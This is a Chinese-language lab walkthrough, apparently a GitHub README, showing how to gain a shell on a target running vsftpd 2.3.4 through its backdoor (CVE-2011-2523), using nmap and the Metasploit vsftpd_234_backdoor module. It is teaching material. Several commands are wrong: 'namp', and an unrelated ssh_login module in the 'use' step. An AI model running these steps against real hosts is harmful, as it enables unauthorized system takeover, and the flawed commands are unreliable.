# Exploit vsftpd
使用Metasploit進行vsftpd弱點利用。

## **環境&工具**
* 一台Kali Linux
* 一台有vsftpd-2.3.4服務的靶機

## **vsftpd介紹**
* CVE：資訊安全有關的資料庫，收集各種資安弱點及漏洞並給予編號以便於公眾查閱。
  * CVE-2011-2523
  * 俗稱笑臉漏洞。
* VsFtpd 是一種 FTP server 的服務。
* 2.3.4 的版本當中具有後門，在檢測到用戶名帶有特殊字符：）時，會自動打開6200端口，此結果屬於開發者設計上的失誤。

## **破解流程**
* step1：針對目標機器做掃描，掃描這台主機有開那些服務
  * 這邊使用nmap這套工具做掃描，檢測目標主機是否在線上、port開放的情況
  * nmap其他相關指令請參考https://zh.wikipedia.org/zh-tw/Nmap
    > ```shell
    > namp -sV xxx.xxx.xxx.xxx
    > ```
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/1-1.png)
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/1-2.png)
* step2：開啟Metasploit
    > ```shell
    > msfconsole
    > ```
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/2-1.png)
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/2-2.png)
* step3：開啟Metasploit這套工具尋找模組腳本
  * 這邊使用模組名稱是`exploit/unix/ftp/vsftpd_234_backdoor`
  
    > ```shell
    > search vsftp
    > use auxiliary/scanner/ssh/ssh_login
    > ```
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/3-1.png)
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/3-2.png)
* step4：查看使用的模組腳本需要設定的參數
  * 這邊四個重要的參數必須設定，`目標主機IP`、`目標主機port號`
  
    > ```shell
    > show options
    > ```
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/4.png)
* step5：設定目標主機IP
    > ```shell
    > set rhost xxx.xxx.xxx.xxx
    > ```
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/5.png)  
* step6：exploit
 * 顯示 Found shell 表示已經成功進入靶機。
 
    > ```shell
    > exploit
    > or
    > run
    > ```
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/6.png)
* step7：成功後可取得目標主機控制權
    > ![image](https://github.com/WanShannn/Exploit-vsftpd/blob/main/result/7.png)

## **References**
* https://zh.m.wikipedia.org/zh-tw/%E5%85%AC%E5%85%B1%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9A%B4%E9%9C%B2
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
* https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/
